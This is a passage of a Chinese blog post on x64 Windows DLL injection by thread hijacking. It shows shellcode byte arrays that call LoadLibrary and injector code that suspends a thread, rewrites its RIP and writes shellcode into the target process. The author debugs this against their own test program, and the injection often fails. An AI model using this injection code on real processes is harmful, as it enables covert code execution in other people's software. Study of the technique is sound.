</span><span class=c1></span>	<span class=mh>0x5F</span><span class=p>,</span>                                                                   <span class=c1>// pop rdi
</span><span class=c1></span>	<span class=mh>0x5E</span><span class=p>,</span>                                                                   <span class=c1>// pop rsi
</span><span class=c1></span>	<span class=mh>0x5D</span><span class=p>,</span>                                                                   <span class=c1>// pop rbp
</span><span class=c1></span>	<span class=mh>0x5B</span><span class=p>,</span>                                                                   <span class=c1>// pop rbx
</span><span class=c1></span>	<span class=mh>0x5A</span><span class=p>,</span>                                                                   <span class=c1>// pop rdx
</span><span class=c1></span>	<span class=mh>0x59</span><span class=p>,</span>                                                                   <span class=c1>// pop rcx
</span><span class=c1></span>	<span class=mh>0x9D</span><span class=p>,</span>                                                                   <span class=c1>// popfq
</span><span class=c1></span>	<span class=mh>0x58</span><span class=p>,</span>                                                                   <span class=c1>// pop rax
</span><span class=c1></span>	<span class=mh>0xC3</span>                                                                    <span class=c1>// ret
</span><span class=c1>// 上面的shellcode无非就是先保存现场，调用LoadLibrary，然后再还原现场，避免出错。
</span><span class=c1></span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>shellcode2:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>ShellCode</span> <span class=p>[]</span> <span class=o>=</span>
<span class=p>{</span> 
<span class=mh>0x48</span><span class=p>,</span><span class=mh>0x83</span><span class=p>,</span><span class=mh>0xEC</span><span class=p>,</span><span class=mh>0x28</span><span class=p>,</span>   <span class=c1>//sub rsp,28
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0x89</span><span class=p>,</span><span class=mh>0x44</span><span class=p>,</span><span class=mh>0x24</span><span class=p>,</span><span class=mh>0x18</span><span class=p>,</span>  <span class=c1>// mov rsp+18,rax
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0x89</span><span class=p>,</span><span class=mh>0x4C</span><span class=p>,</span><span class=mh>0x24</span><span class=p>,</span><span class=mh>0x10</span><span class=p>,</span>  <span class=c1>// mov rsp+10,rcx
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0xB9</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span><span class=mh>0x11</span><span class=p>,</span>  <span class=c1>//mov rcx,1111111111111111  (DLL路径)
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0xB8</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span><span class=mh>0x22</span><span class=p>,</span>  <span class=c1>//mov rax,2222222222222222  (LoadLibrary地址)
</span><span class=c1></span><span class=mh>0xFF</span><span class=p>,</span><span class=mh>0xD0</span><span class=p>,</span> <span class=c1>//call rax
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0x8B</span><span class=p>,</span><span class=mh>0x4C</span><span class=p>,</span><span class=mh>0x24</span><span class=p>,</span><span class=mh>0x10</span><span class=p>,</span> <span class=c1>// mov rcx,rsp+10
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0x8B</span><span class=p>,</span><span class=mh>0x44</span><span class=p>,</span><span class=mh>0x24</span><span class=p>,</span><span class=mh>0x18</span><span class=p>,</span>  <span class=c1>// mov rax,rsp+18
</span><span class=c1></span><span class=mh>0x48</span><span class=p>,</span><span class=mh>0x83</span><span class=p>,</span><span class=mh>0xC4</span><span class=p>,</span><span class=mh>0x28</span><span class=p>,</span> <span class=c1>// add rsp,28
</span><span class=c1></span><span class=mh>0x49</span><span class=p>,</span><span class=mh>0xBB</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span>  <span class=c1>//mov r11,3333333333333333  (返回地址)
</span><span class=c1></span><span class=mh>0x41</span><span class=p>,</span><span class=mh>0xFF</span><span class=p>,</span><span class=mh>0xE3</span>  <span class=c1>// jmp r11
</span><span class=c1></span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 为shellcode申请内存空间
</span><span class=c1></span><span class=n>ShellCodeAddr</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>ScSize</span><span class=p>,</span> <span class=n>MEM_COMMIT</span> <span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
<span class=c1>//获取线程ID
</span><span class=c1></span><span class=n>ThreadID</span> <span class=o>=</span> <span class=n>GetThreadID</span><span class=p>(</span><span class=n>dwPID</span><span class=p>);</span>
<span class=c1>//获取线程句柄
</span><span class=c1></span><span class=n>hThread</span> <span class=o>=</span> <span class=n>OpenThread</span><span class=p>(</span><span class=n>THREAD_ALL_ACCESS</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>ThreadID</span><span class=p>);</span>
<span class=c1>// 将线程挂起
</span><span class=c1></span><span class=n>SuspendThread</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
<span class=c1>// 设置权限，如果获取线程前不这样做就会导致无法获得上下文数据，ctx.RIP读取为0
</span><span class=c1></span><span class=n>ctx</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=n>CONTEXT_CONTROL</span><span class=p>;</span>
<span class=c1>// 获取线程上下文Context
</span><span class=c1></span><span class=n>GetThreadContext</span><span class=p>(</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=p>);</span>
<span class=c1>//保存OldRip，并更改Rip为Shellcode地址，并修改上下文属性
</span><span class=c1></span><span class=n>OldRip</span> <span class=o>=</span> <span class=n>ctx</span><span class=p>.</span><span class=n>Rip</span><span class=p>;</span>
<span class=n>ctx</span><span class=p>.</span><span class=n>Rip</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>ShellCodeAddr</span><span class=p>;</span>
<span class=n>ctx</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=n>CONTEXT_CONTROL</span><span class=p>;</span>
<span class=c1>//将返回地址，DLL路径，以及LoadLibrary地址写入Shellcode的预留空间
</span><span class=c1>// shellcode1
</span><span class=c1></span><span class=n>memcpy</span><span class=p>(</span><span class=n>ShellCode</span> <span class=o>+</span> <span class=mi>3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>OldRip</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>OldRip</span><span class=p>));</span>
<span class=n>memcpy</span><span class=p>(</span><span class=n>ShellCode</span> <span class=o>+</span> <span class=mi>41</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pRemoteBuf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>pRemoteBuf</span><span class=p>));</span>
<span class=n>memcpy</span><span class=p>(</span><span class=n>ShellCode</span> <span class=o>+</span> <span class=mi>51</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pThreadProc</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>pThreadProc</span><span class=p>));</span>
<span class=c1>// shellcode2
</span><span class=c1>//memcpy(ShellCode + 52, &amp;OldRip, sizeof(OldRip));
</span><span class=c1>//memcpy(ShellCode + 16, &amp;pRemoteBuf, sizeof(pRemoteBuf));
</span><span class=c1>//memcpy(ShellCode + 26, &amp;pThreadProc, sizeof(pThreadProc));
</span><span class=c1></span>
<span class=c1>//将shellcode写入内存
</span><span class=c1></span><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>ShellCodeAddr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ShellCode</span><span class=p>,</span> <span class=n>ScSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>//更新线程上下文
</span><span class=c1></span><span class=n>SetThreadContext</span><span class=p>(</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=p>);</span>
<span class=c1>// 唤醒线程
</span><span class=c1></span><span class=n>ResumeThread</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
<span class=c1>//释放申请的内存
</span><span class=c1></span><span class=n>VirtualFreeEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>ShellCodeAddr</span><span class=p>,</span> <span class=n>ScSize</span><span class=p>,</span> <span class=n>MEM_DECOMMIT</span><span class=p>);</span>
<span class=c1>// 关闭句柄
</span><span class=c1></span><span class=n>CloseHandle</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>我们通过编写的注入器dll_inject.exe，以及测试用exe文件通过x64dbg联调。</p>
<p>首先用x64dbg加载测试用exe文件，再用x64dbg以以下命令行参数运行dll_inject.exe:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=s>&#34;F:\dll_inject\dll_inject</span><span class=se>\x64</span><span class=s>\Release\dll_inject.exe&#34;</span> <span class=n>HookTest</span><span class=p>.</span><span class=n>exe</span> <span class=o>-</span><span class=n>i</span> <span class=mi>6</span> <span class=n>TestDll</span><span class=p>.</span><span class=n>dll</span>
</code></pre></td></tr></table>
</div>
</div><p>我们在测试用exe文件下图出停下，然后用注入器注入DLL</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%b5%8b%e8%af%95%e7%94%a8exe%e6%9a%82%e5%81%9c%e5%a4%84.png data-srcset="/dllinjection/%E6%B5%8B%E8%AF%95%E7%94%A8exe%E6%9A%82%E5%81%9C%E5%A4%84.png, %e6%b5%8b%e8%af%95%e7%94%a8exe%e6%9a%82%e5%81%9c%e5%a4%84.png 1.5x, /dllinjection/%E6%B5%8B%E8%AF%95%E7%94%A8exe%E6%9A%82%E5%81%9C%E5%A4%84.png 2x" data-sizes=auto alt=/dllinjection/%E6%B5%8B%E8%AF%95%E7%94%A8exe%E6%9A%82%E5%81%9C%E5%A4%84.png title=测试用exe暂停处></p>
<p>我们在线程劫持的主函数中的如下代码打上断点:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>ShellCodeAddr</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>ScSize</span><span class=p>,</span> <span class=n>MEM_COMMIT</span> <span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>从而获取到Shellcode将要写入的内存空间中，该内存空间是目标进程里的空间，该次例子中的地址，以及该地址下的内容如下:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e4%b8%bashellcode%e7%9a%84%e5%86%85%e5%ad%98%e7%a9%ba%e9%97%b4.png data-srcset="/dllinjection/%E4%B8%BAshellcode%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png, %e4%b8%bashellcode%e7%9a%84%e5%86%85%e5%ad%98%e7%a9%ba%e9%97%b4.png 1.5x, /dllinjection/%E4%B8%BAshellcode%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png 2x" data-sizes=auto alt=/dllinjection/%E4%B8%BAshellcode%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png title=为shellcode的内存空间></p>
<p>然后再将dll_inject.exe运行到如下代码处:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>ShellCodeAddr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ShellCode</span><span class=p>,</span> <span class=n>ScSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>当注入器像目标进程写入Shellcoide后我们再观察该区域，查看Shellcode的内容(我们以shellcode2为例)，如下:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e5%86%99%e5%85%a5shellcode%e5%90%8e.png data-srcset="/dllinjection/%E5%86%99%E5%85%A5shellcode%E5%90%8E.png, %e5%86%99%e5%85%a5shellcode%e5%90%8e.png 1.5x, /dllinjection/%E5%86%99%E5%85%A5shellcode%E5%90%8E.png 2x" data-sizes=auto alt=/dllinjection/%E5%86%99%E5%85%A5shellcode%E5%90%8E.png title=写入shellcode后></p>
<p>我们可以看到地址13cc3c70018处将LoadLibraryW函数地址写入rax寄存器中，并接着调用了该函数。我们跳转至13cc3c60000地址处查看保存在rcx寄存器中的数据是什么，如下图：</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=Dll%e8%b7%af%e5%be%84.png data-srcset="/dllinjection/Dll%E8%B7%AF%E5%BE%84.png, Dll%e8%b7%af%e5%be%84.png 1.5x, /dllinjection/Dll%E8%B7%AF%E5%BE%84.png 2x" data-sizes=auto alt=/dllinjection/Dll%E8%B7%AF%E5%BE%84.png title=Dll路径></p>
<p>可以发现其就是Dll的路径字符串。而在x86_64中，rcx为函数调用的第一个参数，因此该过程就是调用LoadLibraryW加载目标DLL。</p>
<p>再看地址13cc3c70032处保存于r11的地址，其实就是测试用exe文件暂停等待被注入器注入DLL的地址，可看上面截图测试用exe文件停止的地址。</p>
<p>此时我们再查看测试用exe的RIP寄存器的值，依然是测试用exe暂停的地址。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=RIPOLD.png data-srcset="/dllinjection/RIPOLD.png, RIPOLD.png 1.5x, /dllinjection/RIPOLD.png 2x" data-sizes=auto alt=/dllinjection/RIPOLD.png title=RIPOLD></p>
<p>回到注入器，我们将代码执行到</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>SetThreadContext</span><span class=p>(</span><span class=n>hThread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>然后再次查看测试用exe的RIP的值</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=RIPNEW.png data-srcset="/dllinjection/RIPNEW.png, RIPNEW.png 1.5x, /dllinjection/RIPNEW.png 2x" data-sizes=auto alt=/dllinjection/RIPNEW.png title=RIPNEW></p>
<p>可以发现RIP地址已经改变，但是我们发现此时测试用exe并不能单步调试，我们需要让注入器先把线程唤醒，执行注入器代码到</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>ResumeThread</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>此时测试用exe就能继续单步调试了,然后再调用LoadLibrary的时候就发生了EXCEPTION_ACCESS_VIOLATION异常，发生异常处在下图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e5%8f%91%e7%94%9f%e5%bc%82%e5%b8%b8%e5%9c%b0%e5%9d%80.png data-srcset="/dllinjection/%E5%8F%91%E7%94%9F%E5%BC%82%E5%B8%B8%E5%9C%B0%E5%9D%80.png, %e5%8f%91%e7%94%9f%e5%bc%82%e5%b8%b8%e5%9c%b0%e5%9d%80.png 1.5x, /dllinjection/%E5%8F%91%E7%94%9F%E5%BC%82%E5%B8%B8%E5%9C%B0%E5%9D%80.png 2x" data-sizes=auto alt=/dllinjection/%E5%8F%91%E7%94%9F%E5%BC%82%E5%B8%B8%E5%9C%B0%E5%9D%80.png title=发生异常地址></p>
<p>但是未能找出原因，可以看到上面还调用了一个RtlGetFullPathName的函数，根据函数名推测其是获取DLL路径，接着判断返回值是否为有符号数，看我们触发异常的执行路径，返回值应该不为负数。通过MSDN查看该函数的返回值，获取成功后会返回字符串长度，失败则返回零，因此可以推测该函数已经获取到了DLL路径名，并返回大于0的数。但为什么会出现异常，我就不懂了。出现异常的那句指令的作用是传送对齐的封装好的单精度数，我现在的能力没能支持我找出出现异常的原因。</p>
<p>接下来我们通过Shellcode1再次进行分析。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=shellcode1%e5%86%99%e5%85%a5.png data-srcset="/dllinjection/shellcode1%E5%86%99%E5%85%A5.png, shellcode1%e5%86%99%e5%85%a5.png 1.5x, /dllinjection/shellcode1%E5%86%99%E5%85%A5.png 2x" data-sizes=auto alt=/dllinjection/shellcode1%E5%86%99%E5%85%A5.png title=shellcode1写入></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=shellcode1%e5%86%99%e5%85%a52.png data-srcset="/dllinjection/shellcode1%E5%86%99%E5%85%A52.png, shellcode1%e5%86%99%e5%85%a52.png 1.5x, /dllinjection/shellcode1%E5%86%99%E5%85%A52.png 2x" data-sizes=auto alt=/dllinjection/shellcode1%E5%86%99%E5%85%A52.png title=shellcode1写入2></p>
<p>Shellcode1是直接从InjectAllTheThing中写的Shellcode复制过来的，但是依然不能实现。并且这段Shellcode我有非常多不解的疑问，这里把返回地址写入rax寄存器，但是在没保存rax当前值的情况下又将LoadLibrary的地址写入rax，并且在将参数保存到rcx之前还push了一个dummy数据，结果调用LoadLibrary后马上又pop rax，也即将dummy数据存入rax中，这样一来返回地址就丢失了，虽然最后还原了初始rax，但是ret去的地址却不知道是哪里了的。</p>
<p>但是该shellcode1 依然在shellcode2出现EXCEPTION_ACCESS_VIOLATION的地方也出现了相同异常。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=shellcode1%e5%bc%82%e5%b8%b8.png data-srcset="/dllinjection/shellcode1%E5%BC%82%E5%B8%B8.png, shellcode1%e5%bc%82%e5%b8%b8.png 1.5x, /dllinjection/shellcode1%E5%BC%82%E5%B8%B8.png 2x" data-sizes=auto alt=/dllinjection/shellcode1%E5%BC%82%E5%B8%B8.png title=shellcode1异常></p>
<p>但是shellcode2的逻辑是很清晰，感觉也没有什么问题的，但依然也出现了错误。</p>
<p>在这测试样例情况下，此时r15值为全0，因此我更改成如下内容，让shellcode1更合理</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e4%bf%ae%e6%94%b9%e5%90%8e%e7%9a%84shellcode1.png data-srcset="/dllinjection/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84shellcode1.png, %e4%bf%ae%e6%94%b9%e5%90%8e%e7%9a%84shellcode1.png 1.5x, /dllinjection/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84shellcode1.png 2x" data-sizes=auto alt=/dllinjection/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84shellcode1.png title=修改后的shellcode1></p>
<p>这样ret就能ret到push r15的地址，也就是注入前的地址，再次唤醒线程执行，发现注入成功了</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=shellcode1%e4%bf%ae%e6%94%b9%e5%90%8e%e6%b3%a8%e5%85%a5%e7%bb%93%e6%9e%9c.png data-srcset="/dllinjection/shellcode1%E4%BF%AE%E6%94%B9%E5%90%8E%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C.png, shellcode1%e4%bf%ae%e6%94%b9%e5%90%8e%e6%b3%a8%e5%85%a5%e7%bb%93%e6%9e%9c.png 1.5x, /dllinjection/shellcode1%E4%BF%AE%E6%94%B9%E5%90%8E%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C.png 2x" data-sizes=auto alt=/dllinjection/shellcode1%E4%BF%AE%E6%94%B9%E5%90%8E%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C.png title=shellcode1修改后注入结果></p>
<p>并且程序能继续正常运行到进程结束，</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e8%bf%90%e8%a1%8c%e7%bb%93%e6%9e%9c.png data-srcset="/dllinjection/%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png, %e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e8%bf%90%e8%a1%8c%e7%bb%93%e6%9e%9c.png 1.5x, /dllinjection/%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png 2x" data-sizes=auto alt=/dllinjection/%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png title=调试环境运行结果></p>
<p>但是，脱离了调试器环境，再次实行注入就会发现注入依然失败(即不能在程序中查找到目标DLL)，并且注入后程序闪退。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e8%84%b1%e7%a6%bb%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e7%ba%bf%e7%a8%8b%e5%8a%ab%e6%8c%81%e6%b3%a8%e5%85%a5.png data-srcset="/dllinjection/%E8%84%B1%E7%A6%BB%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%85%A5.png, %e8%84%b1%e7%a6%bb%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e7%ba%bf%e7%a8%8b%e5%8a%ab%e6%8c%81%e6%b3%a8%e5%85%a5.png 1.5x, /dllinjection/%E8%84%B1%E7%A6%BB%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%85%A5.png 2x" data-sizes=auto alt=/dllinjection/%E8%84%B1%E7%A6%BB%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%85%A5.png title=脱离调试环境线程劫持注入></p>
<p>我对该问题的推测，一个原因是，我在调试环境下让程序暂停在一个地址上，在该地址上注入，调用LoadLibray 以及还原现场都不会影响到原程序需要用的数据。而当我脱离了调试环境，程序会运行到system(&ldquo;pause&rdquo;)停下，并等待我反应。在这个情况下以这个Shellcode注入就会导致错误，例如原程序要用的数据被修改丢失等原因。</p>
<p>那么我们在测试用EXE程序执行到system(&ldquo;pause&rdquo;)停下后在进行注入</p>
<p>调试环境下，运行测试用EXE到system(&ldquo;pause&rdquo;)语句处，程序的RIP指向了下图所示区域</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=systempause.png data-srcset="/dllinjection/systempause.png, systempause.png 1.5x, /dllinjection/systempause.png 2x" data-sizes=auto alt=/dllinjection/systempause.png title=systempause></p>
<p>观察此时的寄存器，我们寻找到空值的寄存器，并将返回地址保存在空闲寄存器中，以便不造成影响入栈</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e5%81%9c%e4%b8%8b%e5%90%8e%e7%9a%84%e5%af%84%e5%ad%98%e5%99%a8%e5%80%bc.png data-srcset="/dllinjection/%E5%81%9C%E4%B8%8B%E5%90%8E%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E5%80%BC.png, %e5%81%9c%e4%b8%8b%e5%90%8e%e7%9a%84%e5%af%84%e5%ad%98%e5%99%a8%e5%80%bc.png 1.5x, /dllinjection/%E5%81%9C%E4%B8%8B%E5%90%8E%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E5%80%BC.png 2x" data-sizes=auto alt=/dllinjection/%E5%81%9C%E4%B8%8B%E5%90%8E%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E5%80%BC.png title=停下后的寄存器值></p>
<p>我们将注入器的第一次修改的shellcode1中的r15寄存器用来保存返回地址，修改成r12用来保存返回地址。再次进行注入。</p>
<p>第二次修改Shellcode1:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e7%ac%ac%e4%ba%8c%e6%ac%a1%e4%bf%ae%e6%94%b9shellcode1.png data-srcset="/dllinjection/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9shellcode1.png, %e7%ac%ac%e4%ba%8c%e6%ac%a1%e4%bf%ae%e6%94%b9shellcode1.png 1.5x, /dllinjection/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9shellcode1.png 2x" data-sizes=auto alt=/dllinjection/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9shellcode1.png title=第二次修改shellcode1></p>
<p>运行到shellcode的起始地址，进入地址7FFDAACACDF4中查看，发现返回地址为一个ret，我们再查看此时的栈顶，栈顶存的地址也就是7FFDAACACDF4上ret将要返回的地址。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=shellcode%e8%bf%94%e5%9b%9e%e5%9c%b0%e5%9d%80.png data-srcset="/dllinjection/shellcode%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png, shellcode%e8%bf%94%e5%9b%9e%e5%9c%b0%e5%9d%80.png 1.5x, /dllinjection/shellcode%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png 2x" data-sizes=auto alt=/dllinjection/shellcode%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png title=shellcode返回地址></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=shellcode%e8%bf%94%e5%9b%9e%e7%9a%84ret%e7%9a%84%e8%bf%94%e5%9b%9e%e5%9c%b0%e5%9d%80.png data-srcset="/dllinjection/shellcode%E8%BF%94%E5%9B%9E%E7%9A%84ret%E7%9A%84%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png, shellcode%e8%bf%94%e5%9b%9e%e7%9a%84ret%e7%9a%84%e8%bf%94%e5%9b%9e%e5%9c%b0%e5%9d%80.png 1.5x, /dllinjection/shellcode%E8%BF%94%E5%9B%9E%E7%9A%84ret%E7%9A%84%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png 2x" data-sizes=auto alt=/dllinjection/shellcode%E8%BF%94%E5%9B%9E%E7%9A%84ret%E7%9A%84%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png title=shellcode返回的ret的返回地址></p>
<p>我们继续运行测试用EXE，查看是否注入成功，发现其又在前面异常的地方发生了异常,也就是调用LoadLibray函数便发生了异常，在该函数内部。</p>
